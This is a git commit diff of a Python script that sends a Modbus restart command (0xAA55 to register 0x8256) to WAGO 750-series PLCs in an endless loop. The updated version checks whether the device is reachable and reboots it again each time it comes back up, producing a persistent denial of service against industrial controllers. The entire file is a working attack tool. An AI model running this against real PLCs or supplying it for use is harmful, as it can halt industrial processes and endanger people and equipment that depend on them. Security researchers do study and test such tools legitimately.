c629097efa957f58e0dca1c9721c35384046ba86
Beau Taub <1743650+btaub@users.noreply.github.com>
2026-01-12 23:12:36 -0500

    Update wago_modbus_infinite_reboot.py

--- wago_modbus_infinite_reboot.py
+++ wago_modbus_infinite_reboot.py
@@ -1,39 +1,48 @@
+#!/usr/bin/env python3
+'''
+ send restart cmd to wago 750-xxx
 
-#!/usr/bin/env python
-
-#---------------------------------------------------------------------------#
-# send restart cmd to wago 750-352
-#
-# requires pymodbus
-#---------------------------------------------------------------------------#
-
-from pymodbus.client.sync import ModbusTcpClient as ModbusClient
-
-import logging
+ requires pymodbus
+'''
 import time
-logging.basicConfig()
-log = logging.getLogger()
-#log.setLevel(logging.DEBUG)
-log.setLevel(logging.INFO)
-
+import socket
 import argparse
+from pymodbus.client import ModbusTcpClient as ModbusClient
+
 parser = argparse.ArgumentParser()
 parser.add_argument("--rhost" ,help="PLC ip address")
-parser.add_argument("--rport", type=int)
+parser.add_argument("--rport", type=int, default=502)
 args = parser.parse_args()
-parser.set_defaults(rport=502)
 
-client = ModbusClient(args.rhost, port=args.rport)
-client.connect()
+# Check socket
+def check_device_status():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(1)
+        s.connect((args.rhost, args.rport))
+        print(f"Socket connected: {s}")
 
-#log.info("Restarting WAGO 750-352")
+        return True
 
-# write value of 0xAA55 to register address 0x8256 on UID 1
-# from pg 185 of the manual for the 750-x series of devices
+    except Exception as e:
+        print(f"{args.rhost} is down, exception message: {e}")
+
+        return False
+
+# write value 0xAA55 to register address 0x8256 on UID 1
+# from pg 185 of the manual for the 750-xxx series of devices
 while True:
-    log.info("Restarting WAGO 750-352")
-    rq = client.write_register(8256, 0xaa55, unit=1)
-    log.info("Sent, sleeping for 6 seconds")
-    time.sleep(6)
+    try:
+        is_up = check_device_status()
+        if is_up:
+            client = ModbusClient(args.rhost, port=args.rport)
+            client.connect()
 
-client.close()
+            print("\nRestarting WAGO 750-352\n")
+            req = client.write_register(8256, 0xAA55, device_id=1, no_response_expected=True)
+
+            client.close()
+            time.sleep(.5)
+    except Exception as e:
+        print(f"Exception in main: {e}...")
+
